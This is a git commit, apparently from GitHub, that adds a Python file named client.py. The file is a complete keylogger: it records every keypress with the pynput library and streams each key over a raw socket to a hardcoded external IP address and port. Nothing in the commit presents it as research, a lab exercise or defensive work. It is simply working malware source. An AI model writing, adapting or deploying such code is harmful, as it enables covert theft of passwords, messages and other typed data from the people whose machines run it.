1c8d3be547f07ec43a3dbca4e8554732771ccd72
DoggoV2 <72258939+DoggoV2@users.noreply.github.com>
2021-01-03 15:18:56 +0100

    Add files via upload

---
+++ client.py
@@ -0,0 +1,20 @@
+import socket
+from pynput.keyboard import Listener
+socket_family = socket.AF_INET
+socket_type = socket.SOCK_STREAM
+
+server = socket.socket(socket_family, socket_type, proto=0)
+host = '178.135.1.229'
+port = 54321
+server.connect((host, port))
+
+def on_press(key):
+    try:
+        server.send(bytes(str(key.char), encoding='utf-8'))
+        print('sent')
+    except AttributeError:
+        server.send(bytes(str(key), encoding='utf-8'))
+while True:
+    with Listener(on_press=on_press) as listener:
+         listener.join()
+
